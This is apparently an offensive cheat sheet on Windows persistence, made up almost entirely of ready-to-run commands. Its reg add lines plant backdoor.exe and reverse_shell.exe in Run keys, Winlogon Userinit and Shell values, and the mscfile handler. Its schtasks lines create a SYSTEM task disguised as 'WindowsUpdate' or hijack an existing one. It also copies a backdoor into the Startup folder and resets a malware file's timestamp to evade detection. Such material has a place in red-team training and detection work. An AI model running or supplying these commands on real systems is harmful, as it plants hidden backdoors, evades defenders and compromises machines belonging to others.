# Registry & Scheduled Task Persistence

!!! tip "Tip"
    Scheduled tasks with `SYSTEM` privileges are powerful but logged. Use `schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c ..." /sc onlogon /ru SYSTEM` and name the task to blend in with legitimate tasks.

---

## Registry Persistence

### Common Persistence Keys

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
```

### Add Payload to Run Key

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

### Hide Payload via mscfile Handler

```powershell
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /t REG_SZ /d "C:\Users\Public\reverse_shell.exe" /f
```

### Modify Userinit

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe, C:\backdoor.exe" /f
```

### Modify Shell

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\malicious.exe" /f
```

---

## Scheduled Task Persistence

### Create Malicious Task

```powershell
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\backdoor.exe" /sc ONLOGON /ru SYSTEM
```

### List Tasks

```powershell
schtasks /query /fo LIST /v
```

### Modify Existing Task

```powershell
schtasks /change /tn "BackupTask" /tr "C:\Users\Public\reverse_shell.exe"
```

### Run Task Immediately

```powershell
schtasks /run /tn "WindowsUpdate"
```

### Delete Task

```powershell
schtasks /delete /tn "WindowsUpdate" /f
```

---

## Startup Folder Persistence

```powershell
echo %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## Timestamp Manipulation (Evasion)

```powershell
powershell -c "$(Get-Item C:\Users\Public\malware.exe).LastWriteTime=('01/01/2021 12:00:00 PM')"
```
